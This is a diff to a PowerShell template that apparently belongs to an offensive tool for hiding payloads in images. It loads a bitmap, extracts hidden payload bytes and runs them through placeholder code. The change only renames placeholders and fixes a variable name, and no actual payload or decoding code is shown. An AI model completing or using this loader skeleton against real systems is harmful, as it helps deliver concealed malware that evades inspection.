@@ -1,13 +1,13 @@
-[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+[string] $image_source = "{{{ IMAGE_SOURCE }}}"
+[Int32] $byte_length = {{{ BYTE_LENGTH }}}
 
-[string] $image_source = "{{{ PAYLOAD_SOURCE }}}"
-[Int32] $byte_length = {{{ MAX_BITS }}}
+[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 
 {{{ ALGORITHM_CODE }}}
 
 $BitMap = {{{ PAYLOAD_DELIVERY_CODE }}}
 
-$payload_data = Read $BitMap $length
+$payload_data = Read $BitMap $byte_length
 
 {{{ PAYLOAD_EXEC_CODE }}}
 
